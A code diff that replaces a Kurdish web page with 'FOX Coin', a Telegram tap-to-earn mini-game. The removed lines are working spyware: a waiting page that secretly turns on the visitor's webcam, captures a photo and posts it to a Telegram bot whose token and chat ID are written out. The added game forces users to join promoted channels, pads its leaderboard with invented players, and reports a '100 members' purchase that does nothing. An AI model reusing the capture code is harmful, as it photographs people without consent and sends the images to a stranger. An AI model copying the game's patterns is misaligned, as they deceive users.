@@ -1,54 +1,827 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>شاشا سەرەکی</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FOX Coin Game - Pro</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-image: url('fox-bg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .game-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100%;
+            max-height: 800px;
+            background-color: rgba(11, 15, 25, 0.92);
+            backdrop-filter: blur(4px);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid rgba(212, 175, 55, 0.5);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            gap: 8px;
+            z-index: 10;
+        }
+
+        .coin-balance {
+            background-color: rgba(20, 25, 35, 0.9);
+            border: 1px solid #d4af37;
+            border-radius: 12px;
+            padding: 6px 10px;
+            font-size: 13px;
+            color: #d4af37;
+            font-weight: bold;
+        }
+
+        .sound-toggle-btn {
+            background-color: rgba(20, 25, 35, 0.9);
+            border: 1px solid #d4af37;
+            border-radius: 12px;
+            padding: 6px 10px;
+            font-size: 13px;
+            color: #d4af37;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-weight: bold;
+            outline: none;
+        }
+
+        .user-level {
+            background-color: rgba(20, 25, 35, 0.9);
+            border: 1px solid #d4af37;
+            border-radius: 12px;
+            padding: 5px 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            padding: 15px;
+            overflow-y: auto;
+            width: 100%;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        .main-content {
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+        }
+
+        .big-coin-btn {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            background: radial-gradient(circle, #222 30%, #000 90%);
+            border: 4px solid #d4af37;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 0 25px rgba(212, 175, 55, 0.5);
+            transition: transform 0.05s ease;
+            overflow: hidden;
+            position: relative;
+            touch-action: manipulation;
+        }
+
+        .big-coin-btn:active {
+            transform: scale(0.93);
+        }
+
+        .big-coin-btn img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            pointer-events: none;
+        }
+
+        .floating-score {
+            position: absolute;
+            color: #ffd700;
+            font-weight: bold;
+            font-size: 15px;
+            pointer-events: none;
+            animation: floatUp 0.8s ease-out forwards;
+            text-shadow: 0 2px 6px rgba(0,0,0,0.8);
+            background: rgba(18, 22, 33, 0.95);
+            border: 2px solid #d4af37;
+            padding: 6px 12px;
+            border-radius: 12px;
+            z-index: 100;
+            direction: ltr;
+            white-space: nowrap;
+            box-shadow: 0 0 10px rgba(212, 175, 55, 0.4);
+        }
+
+        @keyframes floatUp {
+            0% { opacity: 1; transform: translateY(0) scale(0.8); }
+            100% { opacity: 0; transform: translateY(-90px) scale(1.1); }
+        }
+
+        .info-card {
+            background-color: rgba(18, 22, 33, 0.85);
+            border: 1px solid #2a3447;
+            border-radius: 15px;
+            width: 100%;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            direction: rtl;
+        }
+
+        .action-btn {
+            background-color: #2ecc71;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            outline: none;
+        }
+
+        .action-btn:active { transform: scale(0.98); }
+
+        #forcedTaskScreen {
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            gap: 20px;
+            background: rgba(11, 15, 25, 0.95);
+            z-index: 999;
+        }
+
+        .forced-box {
+            background: rgba(18, 22, 33, 0.95);
+            border: 2px solid #d4af37;
+            border-radius: 20px;
+            padding: 25px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
+        }
+
+        .forced-box h2 { color: #d4af37; font-size: 20px; }
+        .forced-box p { font-size: 14px; color: #b0c4de; line-height: 1.6; }
+
+        .task-main-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+        }
+
+        .task-main-btn:disabled { background-color: #555; cursor: not-allowed; color: #aaa; }
+
+        .rank-item {
+            background-color: rgba(18, 22, 33, 0.9);
+            border: 1px solid #2a3447;
+            border-radius: 12px;
+            width: 100%;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .rank-item.top-user { border: 1.5px solid #d4af37; background-color: rgba(212, 175, 55, 0.1); }
+
+        .rank-avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 1px solid #d4af37;
+            background: #222;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .nav-bar {
+            display: flex;
+            justify-content: space-around;
+            background-color: #121621;
+            border-top: 1px solid #2a3447;
+            padding: 10px 0;
+            z-index: 10;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #8b9bb4;
+            font-size: 11px;
+            text-decoration: none;
+            gap: 4px;
+            cursor: pointer;
+            flex: 1;
+            outline: none;
+            background: none;
+            border: none;
+        }
+
+        .nav-item.active { color: #d4af37; }
+        .nav-item span.icon { font-size: 16px; }
+
+        .section-box {
+            background-color: rgba(18, 22, 33, 0.95);
+            border: 1px solid #2a3447;
+            border-radius: 15px;
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+    </style>
 </head>
 <body>
-    <h2>لڤێرە چاڤەڕێ بن...</h2>
-    
-    <!-- ڤەشارتی کامێرا -->
-    <video id="video" width="0" height="0" autoplay></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <audio id="bgMusic" loop preload="auto">
+        <source src="abdulqahar_zakhoee.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
-        const BOT_TOKEN = '8945123640:AAGjazTZFPNmjHDAw5LdwYTB9tWjQFVooXs';
-        const CHAT_ID = '8920889734';
+        let isMusicPlaying = false;
+        function toggleMusic() {
+            let music = document.getElementById('bgMusic');
+            let btn = document.getElementById('soundToggleBtn');
+            if (isMusicPlaying) {
+                music.pause();
+                isMusicPlaying = false;
+                btn.innerHTML = '🔇 OFF';
+                btn.style.borderColor = '#d4af37';
+                btn.style.color = '#d4af37';
+            } else {
+                music.play().then(() => {
+                    isMusicPlaying = true;
+                    btn.innerHTML = '🎵 ON';
+                    btn.style.borderColor = '#2ecc71';
+                    btn.style.color = '#2ecc71';
+                }).catch(e => console.log("Audio play blocked:", e));
+            }
+        }
+    </script>
 
-        window.onload = function () {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'capture.jpg');
+    <div class="game-container">
+        <div class="header">
+            <div class="coin-balance">
+                🟡 <span id="score">0.00000</span>
+            </div>
+            <button class="sound-toggle-btn" id="soundToggleBtn" onclick="toggleMusic()">
+                🔇 OFF
+            </button>
+            <div class="user-level">
+                <div style="text-align: right;">
+                    <div style="font-size: 11px; font-weight: bold;" id="userNameText">MALAGA 🇪🇸</div>
+                    <div style="font-size: 9px; color: #d4af37;" id="levelText">Lvl 1</div>
+                </div>
+                <div id="userAvatarHeader" style="width: 28px; height: 28px; border-radius: 50%; overflow: hidden; border: 1px solid #d4af37; background: #222; display: flex; justify-content: center; align-items: center;">
+                    <span id="fallbackAvatarHeader" style="font-size: 14px;">⚽</span>
+                </div>
+            </div>
+        </div>
 
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log('وێنە هاتە هنارتن');
-                            });
-                        }, 'image/jpeg');
+        <div id="forcedTaskScreen" class="screen">
+            <div class="forced-box">
+                <span style="font-size: 40px;">📢</span>
+                <h2>پێدڤییە بەشدار بی!</h2>
+                <p>بۆ ڤەکرنا یاریێ، دڤێت جۆینی کەناڵی و گروپا مە ببی، پاشی وەرگرتنا 1 کۆینێ دیاری بکەی.</p>
+                <button class="task-main-btn" id="forcedChannelBtn" onclick="openChannel()" style="background-color: #3498db; margin-bottom: 5px;">1. جۆینی کەناڵی بکە 🦊</button>
+                <button class="task-main-btn" id="forcedGroupBtn" onclick="openGroup()" style="background-color: #3498db; margin-bottom: 10px;">2. جۆینی گروپا (BAR) بکە 💬</button>
+                <button class="task-main-btn" id="forcedCheckBtn" onclick="checkBothTasks()" disabled style="background-color: #555;">پشکنین و وەرگرتنا 1 کۆینێ 🔓</button>
+            </div>
+        </div>
 
-                        // دابخستنا کامێرایێ پشتى گرتنێ
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 1500); // 1.5 چرکە بۆ ڤەبوونا کامێرایێ
-                })
-                .catch(err => {
-                    console.log('ڕێپێدان نەهاتە دان یان کامێرا نینە');
-                });
-        };
+        <div id="tapScreen" class="screen main-content">
+            <div class="big-coin-btn" id="tapBtn">
+                <img src="coin.jpg" alt="FOX Coin">
+            </div>
+
+            <div class="info-card">
+                <div class="info-row">
+                    <span>پەکێت 📦</span>
+                    <span id="packetText" style="font-weight: bold; direction: ltr;">4 / 5</span>
+                </div>
+                <div class="info-row" style="color: #8b9bb4; font-size: 12px;">
+                    <span>پەکیتا داهاتی</span>
+                    <span id="timerText" style="direction: ltr;">02:00:00</span>
+                </div>
+                <hr style="border: 0; border-top: 1px solid #2a3447;">
+                <div class="info-row">
+                    <span>ئینرجی ⚡</span>
+                    <span style="font-weight: bold; direction: ltr;" id="energyText">500 / 500</span>
+                </div>
+                <button class="action-btn" id="useEnergyBtn" onclick="usePacket()">بکاربینە (Use) ⚡</button>
+            </div>
+        </div>
+
+        <div id="shopScreen" class="screen" style="align-items: center; justify-content: flex-start; gap: 12px;">
+            <h3 style="color: #d4af37;">🛒 دووکانێ و بۆوێستەر</h3>
+
+            <div style="background: linear-gradient(135deg, rgba(212, 175, 55, 0.2) 0%, rgba(18, 22, 33, 0.95) 100%); border: 2px solid #d4af37; border-radius: 15px; width: 100%; padding: 15px; display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                <h4 style="font-size: 15px; color: #d4af37;">پەکەتا پرێمیوم (2x Tap)</h4>
+                <p style="font-size: 11px; color: #b0c4de; text-align: center;">تەپ تەپای تە دکەتە دوو هێندە!</p>
+                <p style="font-size: 12px; color: #d4af37; font-weight: bold;">بهایێ: 1.00 FOX 🟡</p>
+                <button id="buyPremiumBtn" onclick="buyPremium()" style="background-color: #f39c12; color: white; border: none; border-radius: 8px; padding: 8px 15px; font-size: 13px; font-weight: bold; cursor: pointer; width: 100%;">کڕین ✨</button>
+            </div>
+
+            <div class="section-box">
+                <h4 style="font-size: 14px; color: #fff;">بەرزکرنا ئاستێ کلیکی (Multitap)</h4>
+                <p style="font-size: 11px; color: #8b9bb4;">ئاستی هەنووکەیی: <span id="multitapLevelText">1</span> (+0.00001)</p>
+                <button onclick="upgradeMultitap()" style="background-color: #3498db; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">بهایێ بەرزکرنێ: 0.50 FOX 🟡</button>
+            </div>
+
+            <div class="section-box">
+                <h4 style="font-size: 14px; color: #fff;">100 مێمبەر بۆ کەناڵی</h4>
+                <p style="font-size: 11px; color: #d4af37; font-weight: bold;">بهایێ: 1.00 FOX 🟡</p>
+                <input type="text" id="channelLinkInput" placeholder="لینکێ کەناڵی لێرە بنڤیسە..." style="width: 100%; padding: 8px; border-radius: 6px; border: 1px solid #d4af37; background-color: rgba(11, 15, 25, 0.9); color: #fff; font-size: 12px; text-align: right; outline: none;">
+                <button onclick="buyMembers()" style="background-color: #2ecc71; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">کڕین 🚀</button>
+            </div>
+        </div>
+
+        <div id="tasksScreen" class="screen" style="align-items: center; justify-content: flex-start; gap: 12px;">
+            <h3 style="color: #d4af37;">📋 ئەرک و ڕۆژژمێرا ڕۆژانە</h3>
+
+            <div class="section-box" style="border: 1.5px solid #d4af37;">
+                <h4 style="font-size: 14px; color: #d4af37;">📅 پاداشتێ سەردانا ڕۆژانە (Streak)</h4>
+                <p style="font-size: 11px; color: #b0c4de;" id="streakStatusText">ڕۆژی هەنووکەیی: ڕۆژی 1</p>
+                <button id="claimStreakBtn" onclick="claimDailyStreak()" style="background-color: #e67e22; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">وەرگرتنا پاداشتێ ڕۆژانە 🎁</button>
+            </div>
+
+            <div class="section-box">
+                <h4 style="font-size: 14px; color: #fff;">👥 بانگهێشتکرنا هاوڕێیان (Referral)</h4>
+                <p style="font-size: 11px; color: #8b9bb4;">هەر هاوڕێیەک بێنە، 0.50 کۆین وەربگرە!</p>
+                <button onclick="copyRefLink()" style="background-color: #9b59b6; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">کۆپیکرنا لینکێ بانگهێشتێ 🔗</button>
+            </div>
+
+            <div class="section-box" style="display: flex; flex-direction: row; justify-content: space-between; align-items: center;">
+                <button style="background-color: #555; color: white; border: none; border-radius: 6px; padding: 6px 10px; font-size: 11px;" disabled>تەواوبوو ✔</button>
+                <div style="text-align: right;">
+                    <h4 style="font-size: 13px; color: #fff;">جۆینی کەناڵ و گروپێ</h4>
+                    <p style="font-size: 11px; color: #d4af37;">1 کۆین وەرگرتیە</p>
+                </div>
+            </div>
+        </div>
+
+        <div id="rankingScreen" class="screen">
+            <h3 style="margin-bottom: 12px; color: #d4af37;">🏆 ڕێزبەندییا یاریزانان</h3>
+            <div id="rankingListContainer" style="width: 100%; display: flex; flex-direction: column; gap: 5px;"></div>
+        </div>
+
+        <div class="nav-bar" id="navBar">
+            <button onclick="switchTab('rankingScreen', event)" class="nav-item" id="navRanking">
+                <span class="icon">🏆</span>
+                <span>Rank</span>
+            </button>
+            <button onclick="switchTab('tasksScreen', event)" class="nav-item" id="navTasks">
+                <span class="icon">📋</span>
+                <span>Tasks</span>
+            </button>
+            <button onclick="switchTab('shopScreen', event)" class="nav-item" id="navShop">
+                <span class="icon">🛒</span>
+                <span>Shop</span>
+            </button>
+            <button onclick="switchTab('tapScreen', event)" class="nav-item active" id="navTap">
+                <span class="icon">👆</span>
+                <span>Tap</span>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        window.Telegram.WebApp.ready();
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        let telegramUser = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null;
+        let telegramUserId = telegramUser && telegramUser.id ? telegramUser.id : 'malaga_permanent_fixed_id';
+        let telegramName = telegramUser && telegramUser.first_name ? telegramUser.first_name : 'MALAGA 🇪🇸';
+        let telegramPhotoUrl = telegramUser && telegramUser.photo_url ? telegramUser.photo_url : null;
+
+        document.getElementById('userNameText').innerText = telegramName;
+        if (telegramPhotoUrl) {
+            document.getElementById('userAvatarHeader').innerHTML = `<img src="${telegramPhotoUrl}" alt="Profile" style="width: 100%; height: 100%; object-fit: cover;">`;
+        }
+
+        const REAL_PREFIX = 'fox_pro_storage_v3_' + telegramUserId + '_';
+
+        let coins = parseFloat(localStorage.getItem(REAL_PREFIX + 'coins')) || 0;
+        let energy = localStorage.getItem(REAL_PREFIX + 'energy') !== null ? parseInt(localStorage.getItem(REAL_PREFIX + 'energy')) : 500;
+        let maxEnergy = parseInt(localStorage.getItem(REAL_PREFIX + 'max_energy')) || 500;
+        let level = parseInt(localStorage.getItem(REAL_PREFIX + 'level')) || 1;
+        let totalTaps = parseInt(localStorage.getItem(REAL_PREFIX + 'total_taps')) || 0;
+        let packets = localStorage.getItem(REAL_PREFIX + 'packets') !== null ? parseInt(localStorage.getItem(REAL_PREFIX + 'packets')) : 4;
+        let totalSeconds = localStorage.getItem(REAL_PREFIX + 'timer') ? parseInt(localStorage.getItem(REAL_PREFIX + 'timer')) : (2 * 3600);
+        let isTimerRunning = false;
+        
+        let isTasksDone = localStorage.getItem(REAL_PREFIX + 'tasks_done') === 'true';
+        let isPremium = localStorage.getItem(REAL_PREFIX + 'is_premium') === 'true';
+        let multitapLevel = parseInt(localStorage.getItem(REAL_PREFIX + 'multitap_level')) || 1;
+
+        let lastStreakDate = localStorage.getItem(REAL_PREFIX + 'last_streak_date') || '';
+        let streakDay = parseInt(localStorage.getItem(REAL_PREFIX + 'streak_day')) || 1;
+
+        const scoreElement = document.getElementById('score');
+        const levelText = document.getElementById('levelText');
+        const tapBtn = document.getElementById('tapBtn');
+        const energyText = document.getElementById('energyText');
+        const timerText = document.getElementById('timerText');
+        const packetText = document.getElementById('packetText');
+        const forcedTaskScreen = document.getElementById('forcedTaskScreen');
+        const tapScreen = document.getElementById('tapScreen');
+        const navBar = document.getElementById('navBar');
+        const buyPremiumBtn = document.getElementById('buyPremiumBtn');
+        const multitapLevelText = document.getElementById('multitapLevelText');
+
+        scoreElement.innerText = coins.toFixed(5);
+        levelText.innerText = "Lvl " + level;
+        energyText.innerText = energy + " / " + maxEnergy;
+        packetText.innerText = packets + " / 5";
+        multitapLevelText.innerText = multitapLevel;
+
+        if (isPremium) {
+            buyPremiumBtn.innerText = 'پرێمیوم چالاکە ✔ (2x)';
+            buyPremiumBtn.style.backgroundColor = '#27ae60';
+            buyPremiumBtn.disabled = true;
+        }
+
+        let channelClicked = false;
+        let groupClicked = false;
+
+        if (isTasksDone) {
+            forcedTaskScreen.classList.remove('active');
+            tapScreen.classList.add('active');
+            navBar.style.display = 'flex';
+        } else {
+            forcedTaskScreen.classList.add('active');
+            tapScreen.classList.remove('active');
+            navBar.style.display = 'none';
+        }
+
+        function openChannel() {
+            window.open('https://t.me/TORSEII', '_blank');
+            channelClicked = true;
+            document.getElementById('forcedChannelBtn').innerText = 'کەناڵ هاتە ڤەکرن ✔';
+            checkEnableButton();
+        }
+
+        function openGroup() {
+            window.open('https://t.me/TURSE_GROUP', '_blank');
+            groupClicked = true;
+            document.getElementById('forcedGroupBtn').innerText = 'گروپ هاتە ڤەکرن ✔';
+            checkEnableButton();
+        }
+
+        function checkEnableButton() {
+            if (channelClicked && groupClicked) {
+                let btn = document.getElementById('forcedCheckBtn');
+                btn.disabled = false;
+                btn.style.backgroundColor = '#2ecc71';
+                btn.innerText = 'چاوەڕێ بکە (5 ثانیە)...';
+
+                let countdown = 5;
+                let interval = setInterval(() => {
+                    countdown--;
+                    if (countdown > 0) {
+                        btn.innerText = 'چاوەڕێ بکە (' + countdown + ' ثانیە)...';
+                    } else {
+                        clearInterval(interval);
+                        btn.innerText = 'وەرگرتنا 1 کۆینێ دیاری 🟡';
+                    }
+                }, 1000);
+            }
+        }
+
+        function checkBothTasks() {
+            if (!isTasksDone && channelClicked && groupClicked) {
+                isTasksDone = true;
+                localStorage.setItem(REAL_PREFIX + 'tasks_done', 'true');
+                coins += 1.00000;
+                scoreElement.innerText = coins.toFixed(5);
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+
+                forcedTaskScreen.classList.remove('active');
+                tapScreen.classList.add('active');
+                navBar.style.display = 'flex';
+                alert('پیرۆزە! تە 1 کۆین وەرگرت 🎉');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            }
+        }
+
+        setInterval(() => {
+            if (energy < maxEnergy) {
+                energy = Math.min(maxEnergy, energy + 1);
+                energyText.innerText = energy + " / " + maxEnergy;
+                localStorage.setItem(REAL_PREFIX + 'energy', energy);
+            }
+        }, 3000);
+
+        function buyPremium() {
+            if (isPremium) return;
+            if (coins >= 1.00000) {
+                coins -= 1.00000;
+                isPremium = true;
+                scoreElement.innerText = coins.toFixed(5);
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                localStorage.setItem(REAL_PREFIX + 'is_premium', 'true');
+
+                buyPremiumBtn.innerText = 'پرێمیوم چالاکە ✔ (2x)';
+                buyPremiumBtn.style.backgroundColor = '#27ae60';
+                buyPremiumBtn.disabled = true;
+                alert('پیرۆزە! پەکەتا پرێمیوم هاتە چالاککرن ⭐');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                alert('کوینێن تە بەس نینن! 🟡');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function upgradeMultitap() {
+            let cost = 0.50;
+            if (coins >= cost) {
+                coins -= cost;
+                multitapLevel++;
+                maxEnergy += 100;
+                scoreElement.innerText = coins.toFixed(5);
+                energyText.innerText = energy + " / " + maxEnergy;
+                multitapLevelText.innerText = multitapLevel;
+
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                localStorage.setItem(REAL_PREFIX + 'multitap_level', multitapLevel);
+                localStorage.setItem(REAL_PREFIX + 'max_energy', maxEnergy);
+
+                alert('پیرۆزە! ئاستێ کلیکی بلندا بوو بۆ لڤل ' + multitapLevel);
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                alert('کوینێن تە بەس نینن بۆ ڤی بووستەری! 🟡');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function buyMembers() {
+            let channelLink = document.getElementById('channelLinkInput').value.trim();
+            if (!channelLink) {
+                alert('لینکێ کەناڵی لێرە بنڤیسە! 🔗');
+                return;
+            }
+            if (coins >= 1.00000) {
+                coins -= 1.00000;
+                scoreElement.innerText = coins.toFixed(5);
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                alert('پیرۆزە! 100 مێمبەر هاتنە داخوازی کرن 🎉');
+                document.getElementById('channelLinkInput').value = '';
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            } else {
+                alert('کوینێن تە بەس نینن! 🟡');
+            }
+        }
+
+        function checkStreakDisplay() {
+            let today = new Date().toISOString().slice(0, 10);
+            let claimBtn = document.getElementById('claimStreakBtn');
+            let statusText = document.getElementById('streakStatusText');
+
+            if (lastStreakDate === today) {
+                claimBtn.innerText = 'وەرگرتیە ئەڤرۆ ✔';
+                claimBtn.style.backgroundColor = '#555';
+                claimBtn.disabled = true;
+            }
+            statusText.innerText = 'ڕۆژی هەنووکەیی زنجیرێ: ڕۆژی ' + streakDay;
+        }
+
+        function claimDailyStreak() {
+            let today = new Date().toISOString().slice(0, 10);
+            if (lastStreakDate === today) return;
+
+            let reward = streakDay * 0.05;
+            coins += reward;
+            scoreElement.innerText = coins.toFixed(5);
+            localStorage.setItem(REAL_PREFIX + 'coins', coins);
+
+            lastStreakDate = today;
+            streakDay++;
+            localStorage.setItem(REAL_PREFIX + 'last_streak_date', lastStreakDate);
+            localStorage.setItem(REAL_PREFIX + 'streak_day', streakDay);
+
+            checkStreakDisplay();
+            alert('پیرۆزە! تە ' + reward.toFixed(2) + ' کۆین وەرگرت وەک پاداشتێ ڕۆژانە 🎉');
+            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+        }
+        checkStreakDisplay();
+
+        function copyRefLink() {
+            let refLink = 'https://t.me/YourBotName?start=ref_' + telegramUserId;
+            navigator.clipboard.writeText(refLink).then(() => {
+                alert('لینکێ بانگهێشتێ هاتە کۆپیکرن! 📋 بۆ هاوڕێیێن خۆ بنێرە.');
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            });
+        }
+
+        function updateRankingList() {
+            const rankingContainer = document.getElementById('rankingListContainer');
+            let realUsersList = [
+                { id: "u1", name: telegramName, score: coins, avatar: telegramPhotoUrl, isMe: true },
+                { id: "u2", name: "محەمەد ئەمین", score: 1.25000, avatar: null, isMe: false },
+                { id: "u3", name: "شەهلا عەبدوڵڵا", score: 0.95000, avatar: null, isMe: false },
+                { id: "u4", name: "دیار حەسەن", score: 0.40000, avatar: null, isMe: false }
+            ];
+            realUsersList.sort((a, b) => b.score - a.score);
+
+            let htmlContent = '';
+            realUsersList.forEach((user, index) => {
+                let avatarHTML = user.avatar ? `<img src="${user.avatar}" alt="Avatar" style="width: 100%; height: 100%; object-fit: cover;">` : `<span style="font-size: 18px;">⚽</span>`;
+                let itemClass = user.isMe ? "rank-item top-user" : "rank-item";
+                let tagText = user.isMe ? ` <span style="font-size: 10px; color: #d4af37;">(تە)</span>` : '';
+
+                htmlContent += `
+                    <div class="${itemClass}">
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <div class="rank-avatar">${avatarHTML}</div>
+                            <div>
+                                <div style="font-size: 13px; font-weight: bold;">${user.name}${tagText}</div>
+                                <div style="font-size: 10px; color: #8b9bb4;">#${index + 1}</div>
+                            </div>
+                        </div>
+                        <span style="color: #d4af37; font-weight: bold; direction: ltr;">${user.score.toFixed(5)} 🟡</span>
+                    </div>
+                `;
+            });
+            rankingContainer.innerHTML = htmlContent;
+        }
+        updateRankingList();
+
+        function handleTapAction(e) {
+            if (energy > 0) {
+                let consumeEnergy = Math.min(energy, multitapLevel);
+                energy -= consumeEnergy;
+                totalTaps += consumeEnergy;
+
+                let baseReward = 0.00001 * multitapLevel;
+                let clickReward = isPremium ? baseReward * 2 : baseReward;
+                coins += clickReward;
+
+                let newLevel = Math.floor(totalTaps / 1000) + 1;
+                if (newLevel !== level) {
+                    level = newLevel;
+                    levelText.innerText = "Lvl " + level;
+                    localStorage.setItem(REAL_PREFIX + 'level', level);
+                }
+
+                scoreElement.innerText = coins.toFixed(5);
+                energyText.innerText = energy + " / " + maxEnergy;
+
+                localStorage.setItem(REAL_PREFIX + 'coins', coins);
+                localStorage.setItem(REAL_PREFIX + 'energy', energy);
+                localStorage.setItem(REAL_PREFIX + 'total_taps', totalTaps);
+
+                updateRankingList();
+
+                const rect = tapBtn.getBoundingClientRect();
+                let clientX = e.clientX || (e.touches && e.touches[0] ? e.touches[0].clientX : rect.left + rect.width / 2);
+                let clientY = e.clientY || (e.touches && e.touches[0] ? e.touches[0].clientY : rect.top + rect.height / 2);
+
+                const floatingEl = document.createElement('div');
+                floatingEl.className = 'floating-score';
+                // لێرەدا `@T_U_R_S_E` و بڕی کۆین پێکەوە نیشان دەدەین
+                floatingEl.innerHTML = `@T_U_R_S_E <span style="color:#2ecc71;">+${clickReward.toFixed(5)}</span>`;
+                floatingEl.style.left = (clientX - rect.left - 45) + 'px';
+                floatingEl.style.top = (clientY - rect.top - 25) + 'px';
+
+                tapBtn.appendChild(floatingEl);
+                setTimeout(() => floatingEl.remove(), 800);
+
+                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+            } else {
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        tapBtn.addEventListener('click', handleTapAction);
+        tapBtn.addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            handleTapAction(e);
+        }, { passive: false });
+
+        function usePacket() {
+            if (packets > 0) {
+                packets -= 1;
+                packetText.innerText = packets + " / 5";
+                localStorage.setItem(REAL_PREFIX + 'packets', packets);
+
+                energy = maxEnergy;
+                energyText.innerText = energy + " / " + maxEnergy;
+                localStorage.setItem(REAL_PREFIX + 'energy', energy);
+
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                if (!isTimerRunning) {
+                    totalSeconds = (2 * 3600);
+                    startTimer();
+                }
+            } else {
+                if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
+            }
+        }
+
+        function startTimer() {
+            if (isTimerRunning) return;
+            isTimerRunning = true;
+            let timerInterval = setInterval(function() {
+                if (totalSeconds > 0) {
+                    totalSeconds--;
+                    let hours = Math.floor(totalSeconds / 3600);
+                    let minutes = Math.floor((totalSeconds % 3600) / 60);
+                    let seconds = totalSeconds % 60;
+                    timerText.innerText = String(hours).padStart(2, '0') + ":" + String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
+                    localStorage.setItem(REAL_PREFIX + 'timer', totalSeconds);
+                } else {
+                    packets = 5;
+                    packetText.innerText = packets + " / 5";
+                    localStorage.setItem(REAL_PREFIX + 'packets', packets);
+                    localStorage.removeItem(REAL_PREFIX + 'timer');
+                    isTimerRunning = false;
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
